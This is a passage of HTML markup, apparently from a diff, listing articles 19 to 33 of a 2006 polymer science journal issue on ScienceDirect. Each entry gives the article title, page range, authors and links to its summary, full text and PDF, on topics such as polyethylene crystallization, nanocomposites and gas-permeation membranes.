Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-5-K&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=5122146c0b172198f3a638626e4b45ee&ie=/sdarticle.pdf">PDF (880 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>19.&nbsp;<input type=checkbox name = art value="B6TXW-4KST3NH-1:19"></td><td width=95% align=left colspan=2><b>
+
+
+
+Empirical determination of equation of state for zero internal pressure in rare gas solids and semi-crystalline polymers</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7455-7459</nobr> </i><br>
+
+
+S. Saeki, F. Wang and Y. Tanaka<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KST3NH-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=19&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=f4adcf0049f3d04803cbf9843e8ecede">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KST3NH-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=19&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1fd8aa9ac931c940d97a66cb65b2b89a">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KST3NH-1-11&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=7cc6d675b61f71f7411268d778cee683&ie=/sdarticle.pdf">PDF (203 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>20.&nbsp;<input type=checkbox name = art value="B6TXW-4KTVTS9-1:20"></td><td width=95% align=left colspan=2><b>
+
+
+
+EPR study of polyaniline highly doped by <i>p</i>-toluenesulfonic acid</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7460-7468</nobr> </i><br>
+
+
+V.I. Krinichnyi, H.-K. Roth, M. Schr&#xf6;dner and B. Wessling<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KTVTS9-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=20&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=6a6fb110ad4dfc2eb29d4ef43170f494">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KTVTS9-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=20&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=cdca05ff44753c8e4d77a0806dd7e5cf">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KTVTS9-1-1N&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=88a0b57e03d0f1d75d488c28ae09e0d8&ie=/sdarticle.pdf">PDF (386 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>21.&nbsp;<input type=checkbox name = art value="B6TXW-4KST3NH-2:21"></td><td width=95% align=left colspan=2><b>
+
+
+
+On the time for fold surfaces to order during the crystallization of polyethylene from the melt and its dependence on molecular parameters</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7469-7476</nobr> </i><br>
+
+
+M.I. Abo el Maaty and D.C. Bassett<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KST3NH-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=21&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=5fdf7566bf6855ed65f29568f4606835">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KST3NH-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=21&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=0703385d1699aac1efd523a7f2dd6b84">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KST3NH-2-D&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=22ea344f1b165625d99f795b44373a51&ie=/sdarticle.pdf">PDF (864 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>22.&nbsp;<input type=checkbox name = art value="B6TXW-4KV8TH6-3:22"></td><td width=95% align=left colspan=2><b>
+
+
+
+A study of global vs. local properties for maleic anhydride modified polypropylene nanocomposites</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7477-7484</nobr> </i><br>
+
+
+Shing-Chung Wong, Hyukjae Lee, Shiyue Qu, Shankar Mall and Ling Chen<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=22&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=4472d282caf7b44803553abdd7242087">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=22&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=fa7348a0facee9a9413b4c8e1d884836">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV8TH6-3-S&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=63a1350a5aef2343251b35173d3d2629&ie=/sdarticle.pdf">PDF (873 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>23.&nbsp;<input type=checkbox name = art value="B6TXW-4KW5WJ4-1:23"></td><td width=95% align=left colspan=2><b>
+
+
+
+Supercritical CO<sub>2</sub> dispersion of nano-clays and clay/polymer nanocomposites</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7485-7496</nobr> </i><br>
+
+
+Steven Horsch, Gulay Serhatkulu, Esin Gulari and Rangaramanujam M. Kannan<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KW5WJ4-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=23&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=4411fb46aa833a37e8aee0e2b50d6407">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KW5WJ4-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=23&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=7f1a2ddfde687a7bbb04f0e336b4bbcb">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KW5WJ4-1-17&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=7b3f923de7ab932fdf9c0ed6aa841419&ie=/sdarticle.pdf">PDF (1074 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>24.&nbsp;<input type=checkbox name = art value="B6TXW-4KV3XYV-3:24"></td><td width=95% align=left colspan=2><b>
+
+
+
+The thermal effects on electrospinning of polylactic acid melts</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7497-7505</nobr> </i><br>
+
+
+Huajun Zhou, Thomas B. Green and Yong Lak Joo<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV3XYV-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=24&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e7bba79dbb84cffef20edf00bc66eddd">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV3XYV-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=24&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=85fa6536035809c72a2cdeaf2d424657">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV3XYV-3-18&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=1cc8bfc10d835e77be2f29da87a00cd3&ie=/sdarticle.pdf">PDF (728 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>25.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXPSK-2:25"></td><td width=95% align=left colspan=2><b>
+
+
+
+The influence of temperature and strain rate on the constitutive and damage responses of polychlorotrifluoroethylene (PCTFE, Kel-F 81)</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7506-7518</nobr> </i><br>
+
+
+Eric N. Brown, Philip J. Rae and E. Bruce Orler<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=25&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=7c56d1539c1ac8dd0a31798893f21673">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=25&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=03306240cd124ad22057442362726a98">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXPSK-2-1X&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=753521a238a4579bf20166b54a142147&ie=/sdarticle.pdf">PDF (2846 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>26.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXPSK-1:26"></td><td width=95% align=left colspan=2><b>
+
+
+
+Gas permeation in poly(ether imide) nanocomposite membranes based on surface-treated silica. Part 1: Without chemical coupling to matrix</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7519-7534</nobr> </i><br>
+
+
+S. Takahashi and D.R. Paul<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=26&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=3622a51b839521af83f2acbff11aea16">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=26&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1abcb0fcaa2c60ec125d9a860f1f9d90">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXPSK-1-1V&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=c332aa382c91bd6c3b1749e6b0442d07&ie=/sdarticle.pdf">PDF (1245 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>27.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXHRX-3:27"></td><td width=95% align=left colspan=2><b>
+
+
+
+Gas permeation in poly(ether imide) nanocomposite membranes based on surface-treated silica. Part 2: With chemical coupling to matrix</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7535-7547</nobr> </i><br>
+
+
+S. Takahashi and D.R. Paul<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXHRX-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=27&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=5d337290eb3def46b6e946ebf19912e0">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXHRX-3&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=27&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=82ddf00c2cc030306c242d950a518609">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXHRX-3-13&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=4d7d3735e904dcc9fadce04ad3cf326a&ie=/sdarticle.pdf">PDF (2263 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>28.&nbsp;<input type=checkbox name = art value="B6TXW-4KSVG5S-1:28"></td><td width=95% align=left colspan=2><b>
+
+
+
+Influence of plasticizers (DOP and CNSL) on mechanical and electrical properties of SBS/polyaniline blends</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7548-7553</nobr> </i><br>
+
+
+Fernando G. Souza, Jr., Bluma G. Soares,  Siddaramaiah, Guilherme M.O. Barra and Marcelo H. Herbst<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KSVG5S-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=28&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1852f1b3b7a72397bc81a81211b1f433">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KSVG5S-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=28&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=45df57764d5de2583f92da049dc28c25">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KSVG5S-1-C&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=ff331147c76134ca40375be4d998a844&ie=/sdarticle.pdf">PDF (552 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>29.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXPSK-6:29"></td><td width=95% align=left colspan=2><b>
+
+
+
+Crystallization behavior of poly(<span class="smCaps">l</span>-lactic acid)</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7554-7563</nobr> </i><br>
+
+
+Munehisa Yasuniwa, Shinsuke Tsubakihara, Koji Iura, Yoshinori Ono, Yusuke Dan and Kazuhisa Takahashi<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-6&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=29&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=5d431c4b322c9916b4811b79a0a54a73">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-6&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=29&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=c289f2aa9792ed97f2dbeaab508c6fa0">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXPSK-6-X&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=451865214e8c5f18eb0238d9f95332b0&ie=/sdarticle.pdf">PDF (557 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>30.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXPSK-5:30"></td><td width=95% align=left colspan=2><b>
+
+
+
+Porous structure of crystalline polymers by exclusion effect of carbon dioxide</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7564-7571</nobr> </i><br>
+
+
+Yoshiaki Koga and Hiromu Saito<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-5&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=30&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=b53163edbc516862a98ab944aa87caa3">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KVXPSK-5&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=30&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1436bdf87dbf9139ecaaf6ca49726512">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KVXPSK-5-19&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=dd45fa92de7e199a825d4949f13db565&ie=/sdarticle.pdf">PDF (579 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>31.&nbsp;<input type=checkbox name = art value="B6TXW-4KV8TH6-2:31"></td><td width=95% align=left colspan=2><b>
+
+
+
+Small-angle neutron scattering study on block and gradient copolymer aqueous solutions</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7572-7579</nobr> </i><br>
+
+
+Satoshi Okabe, Ken-ichi Seno, Shokyoku Kanaoka, Sadahito Aoshima and Mitsuhiro Shibayama<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=31&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=40c05f60f66d0874af31548b29622037">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV8TH6-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=31&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=f380eafe0602916074c13e2da20f38a1">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV8TH6-2-19&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=14af754d285f4c77f9cd55c9e699051d&ie=/sdarticle.pdf">PDF (512 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>32.&nbsp;<input type=checkbox name = art value="B6TXW-4KV2Y7P-7:32"></td><td width=95% align=left colspan=2><b>
+
+
+
+Heterogeneous nucleation uniformizing cell size distribution in microcellular nanocomposites foams</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7580-7589</nobr> </i><br>
+
+
+Wentao Zhai, Jian Yu, Lichuan Wu, Weiming Ma and Jiasong He<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-7&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=32&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=662ccb642b9b0356e6e4d4f888aba50c">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KV2Y7P-7&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=32&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=be75693386fe2900b89fffb3b46a5f7d">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KV2Y7P-7-17&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=71d5cb74dc6fd4a37c4558000ae09d26&ie=/sdarticle.pdf">PDF (1121 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>33.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXHRX-1:33"></td><td width=95% align=left colspan=2><b>
+
+
+
+Epoxy resin containing poly(ethylene oxide)-<i>block</i>-poly(<img src="http://www.sciencedirect.com/scidirimg/entities/25b.gif" alt="var epsilon" border=0>-caprolactone) diblock copolymer: Effect of curing agents on nanostructures</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7590-7600</nobr> </i><br>
+
+
